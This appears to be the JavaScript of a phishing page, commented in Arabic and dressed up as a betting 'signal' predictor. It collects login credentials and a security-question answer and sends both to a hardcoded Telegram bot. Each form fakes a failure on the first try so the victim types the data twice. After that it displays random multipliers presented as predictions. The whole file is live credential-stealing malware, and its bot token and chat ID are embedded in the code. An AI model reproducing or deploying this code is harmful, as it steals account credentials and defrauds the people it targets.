const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let securityAttempts = 0;

// 1. معالجة الدخول
async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;
    btn.disabled = true;
    btn.innerText = "Verifying...";

    await sendToTelegram(`⚠️ محاولة دخول:\n👤 User: ${u}\n🔑 Pass: ${p}`);

    setTimeout(() => {
        if (loginAttempts === 1) {
            document.getElementById('status-text').innerText = "❌ فشل: أعد المحاولة";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        } else {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('security-layer').style.display = 'flex';
        }
    }, 1200);
}

// 2. حل مشكلة التعليق في الواجهة الحمراء
async function finalVerify() {
    const ans = document.getElementById('sec_ans').value;
    const btn = document.getElementById('sec-btn');
    
    if (ans.length < 2) return alert("أدخل الإجابة!");

    securityAttempts++;
    btn.disabled = true;
    btn.innerText = "...Synchronizing"; // الحالة التي كانت تعلق فيها الصفحة

    // إرسال البيانات لتلجرام
    sendToTelegram(`🔑 **SECRET FOUND**\n👤 Answer: ${ans}`);

    // الانتقال الإجباري لكسر التعليق
    setTimeout(() => {
        if (securityAttempts === 1) {
            // تصفير الخانة للمرة الثانية للتمويه
            document.getElementById('sec_ans').value = "";
            btn.disabled = false;
            btn.innerText = "Confirm & Unlock";
            alert("خطأ في المزامنة: أعد كتابة اللقب بدقة!");
        } else {
            // فتح الرادار فوراً
            document.getElementById('security-layer').style.display = 'none';
            const mainApp = document.getElementById('main-app');
            mainApp.classList.remove('hidden');
            mainApp.style.display = 'flex';
        }
    }, 1500); // ينتظر ثانية ونصف ثم ينتقل مهما حدث
}

// دالة الإرسال - تم تعديلها لتكون "خلفية" ولا تعطل الصفحة
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    }).catch(e => console.log("Silent Error"));
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
    }, 800);
}
